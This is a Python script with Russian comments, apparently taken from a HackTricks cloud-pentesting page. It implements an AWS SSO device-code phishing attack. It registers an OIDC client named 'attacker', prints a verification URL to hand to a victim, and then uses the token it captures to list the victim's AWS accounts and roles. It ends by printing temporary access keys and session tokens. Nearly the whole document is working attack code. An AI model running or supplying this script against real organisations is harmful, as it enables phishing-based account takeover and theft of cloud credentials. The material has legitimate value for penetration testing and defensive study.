# https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-identity-center-and-sso-unauthenticated-enum

import boto3

# Параметры для настройки
REGION = 'us-east-1'  # Регион AWS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start'  # URL для начала SSO

# Создание клиента sso-oidc
sso_oidc = boto3.client('sso-oidc', region_name=REGION)

# Регистрация клиента
client = sso_oidc.register_client(
    clientName='attacker',
    clientType='public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')

# Авторизация устройства
authz = sso_oidc.start_device_authorization(
    clientId=client_id,
    clientSecret=client_secret,
    startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)

# Ожидание авторизации и получение токена доступа
token_response = sso_oidc.create_token(
    clientId=client_id,
    clientSecret=client_secret,
    grantType="urn:ietf:params:oauth:grant-type:device_code",
    deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')

# Создание клиента sso для дальнейшего использования токена доступа
sso_client = boto3.client('sso', region_name=REGION)

# Получение списка аккаунтов, к которым у жертвы есть доступ
aws_accounts_response = sso_client.list_accounts(
    accessToken=sso_token,
    maxResults=100
)
accounts = aws_accounts_response.get('accountList', [])

if not accounts:
    print("No accounts available.")
    exit()

# Отображение списка аккаунтов
print("Select an account:")
for idx, account in enumerate(accounts, start=1):
    print(f"{idx}. {account['accountName']} (ID: {account['accountId']})")

# Выбор аккаунта
account_choice = int(input("Enter the number of the account you want to use: "))
selected_account = accounts[account_choice - 1]
account_id = selected_account['accountId']

# Получение списка ролей в выбранном аккаунте
roles_response = sso_client.list_account_roles(
    accessToken=sso_token,
    accountId=account_id
)
roles = roles_response.get('roleList', [])

if not roles:
    print(f"No roles available in account {selected_account['accountName']}.")
    exit()

# Отображение списка ролей
print(f"Roles in account {selected_account['accountName']}:")
for idx, role in enumerate(roles, start=1):
    print(f"{idx}. {role['roleName']}")

# Выбор роли
role_choice = int(input("Enter the number of the role you want to assume: "))
selected_role = roles[role_choice - 1]
role_name = selected_role['roleName']

# Получение временных учетных данных для выбранной роли
sts_creds = sso_client.get_role_credentials(
    accessToken=sso_token,
    roleName=role_name,
    accountId=account_id
)
credentials = sts_creds.get('roleCredentials')

# Вывод временных учетных данных
print("Temporary Credentials:")
print(f"Access Key ID: {credentials['accessKeyId']}")
print(f"Secret Access Key: {credentials['secretAccessKey']}")
print(f"Session Token: {credentials['sessionToken']}")
print(f"Expiration: {credentials['expiration']}")
